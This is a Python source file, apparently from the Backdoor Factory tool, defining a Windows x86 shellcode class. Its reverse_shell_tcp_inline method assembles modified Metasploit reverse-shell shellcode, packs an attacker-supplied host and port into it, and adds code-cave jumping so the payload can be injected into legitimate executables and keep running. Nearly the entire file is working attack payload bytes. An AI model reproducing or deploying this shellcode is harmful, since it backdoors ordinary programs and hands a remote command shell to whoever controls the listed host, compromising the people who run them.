'''

Copyright (c) 2013-2015, Joshua Pitts
All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice,
    this list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
    may be used to endorse or promote products derived from this software without
    specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

'''


##########################################################
#               BEGIN win32 shellcodes                   #
##########################################################
import struct
from intelmodules import eat_code_caves

"""
Windows Intel x32 shellcode class
"""
class winI32_shellcode():
    def __init__(self, HOST, PORT, SUPPLIED_SHELLCODE):
        #could take this out HOST/PORT and put into each shellcode function
        self.HOST = HOST
        self.PORT = PORT
        self.shellcode = ""
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.stackpreserve = "\x90\x90\x60\x9c"
        self.stackrestore = "\x9d\x61"
        self.apis_needed = None


    def pack_ip_addresses(self):
        hostocts = []
        for i, octet in enumerate(self.HOST.split('.')):
            hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip


    def returnshellcode(self):
        return self.shellcode


    def clean_caves_stub(self, CavesToFix):
        stub = ("\x33\xC0"                          # XOR EAX,EAX
                "\x31\xc9"                          # XOR ECX, ECX <- requirment for win10
                "\x64\x8B\x49\x30"                  # mov ecx, dword ptr fs: [ecx + 0x30]
                "\x8B\x49\x08"                      # mov ecx, dword ptr [ecx+8]
                "\x8B\xD9"                          # mov ebx,ecx
                )
        for cave, values in CavesToFix.iteritems():
            stub += "\xbf"                          # mov edi, value below
            stub += struct.pack("<I", values[0])
            stub += "\x03\xfb"                      # add edi, ebx
            stub += "\xb9"                          # mov ecx, value below
            stub += struct.pack("<I", values[1])
            stub += "\xf3\xaa"                      # REP STOS BYTE PTR ES:[EDI]
        return stub


    def reverse_shell_tcp_inline(self, flItms, CavesPicked={}):
        """
        Modified metasploit windows/shell_reverse_tcp shellcode
        to enable continued execution and cave jumping.
        """

        if self.PORT is None:
            print ("This payload requires the PORT parameter -P")
            return False

        if self.HOST is None:
            print "This payload requires a HOST parameter -H"
            return False

        #breakupvar is the distance between codecaves
        breakupvar = eat_code_caves(flItms, 0, 1)
        self.shellcode1 = "\xfc\xe8"

        if flItms['cave_jumping'] is True:
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                                     len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                                     breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                               len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\x89\x00\x00\x00"

        self.shellcode1 += ("\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
                            "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
                            "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
                            "\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
                            "\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
                            "\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
                            "\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
                            "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
                            "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
                            "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86"
                            )

        self.shellcode2 = ("\x5d\x68\x33\x32\x00\x00\x68"
                           "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
                           "\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
                           "\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7"
                           "\x68"
                           )
        self.shellcode2 += self.pack_ip_addresses()  # IP
        self.shellcode2 += ("\x68\x02\x00")
        self.shellcode2 += struct.pack('!H', self.PORT)  # PORT
        self.shellcode2 += ("\x89\xe6\x6a\x10\x56"
                            "\x57\x68\x99\xa5\x74\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3"
                            "\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24"
                            "\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56"
                            "\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89"
                            #The NOP in the line below allows for continued execution.
                            "\xe0\x4e\x90\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0"
                            "\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80"
                            "\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
                            "\x81\xc4\xfc\x01\x00\x00"
                            )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
        return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)

